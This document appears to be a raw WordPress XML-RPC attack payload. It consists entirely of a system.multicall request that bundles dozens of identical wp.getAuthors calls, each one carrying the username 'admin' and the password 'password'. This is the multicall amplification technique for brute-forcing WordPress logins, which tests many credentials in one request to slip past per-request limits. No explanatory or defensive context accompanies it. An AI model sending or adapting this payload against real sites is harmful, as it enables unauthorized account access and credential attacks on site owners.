<?xml version="1.0"?>
<methodCall>
	<methodName>system.multicall</methodName>
	<params>
		<param>
			<value>
				<array>
					<data>
						<value>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<!-- 70 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<!-- 80 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<!-- 90 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
						</value>
					</data>
				</array>
			</value>
		</param>
	</params>
</methodCall>
